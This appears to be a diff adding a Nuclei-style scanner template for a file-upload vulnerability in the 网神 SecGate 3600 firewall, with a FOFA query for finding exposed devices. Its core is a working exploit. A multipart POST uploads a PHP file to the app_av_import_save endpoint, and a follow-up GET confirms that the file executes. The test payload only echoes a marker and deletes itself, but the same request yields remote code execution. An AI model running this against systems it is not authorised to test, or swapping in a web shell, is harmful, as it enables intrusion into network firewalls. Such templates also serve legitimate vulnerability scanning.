@@ -1,0 +1,49 @@
+id: wangshen-secgate-3600-app_av_import_save-file-upload
+
+info:
+  name: "网神 SecGate 3600 防火墙 app_av_import_save 接口文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="网神SecGate 3600防火墙"
+      该防火墙系统在处理 app_av_import_save 接口请求时，未正确验证上传文件的类型及存储路径，攻击者可通过构造恶意请求上传可执行文件，进而实现远程代码执行。
+  tags: 网神SecGate-3600防火墙
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /?g=app_av_import_save HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Accept-Encoding: gzip, deflate, br
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+
+    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+    Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+    10000000
+    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+    Content-Disposition: form-data; name="reqfile";filename="NTest.php"
+    Content-Type: text/plain
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+    Content-Disposition: form-data; name="submit_post"
+
+    app_av_import_save
+    ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+- raw:
+  - |
+    GET /attachements/NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
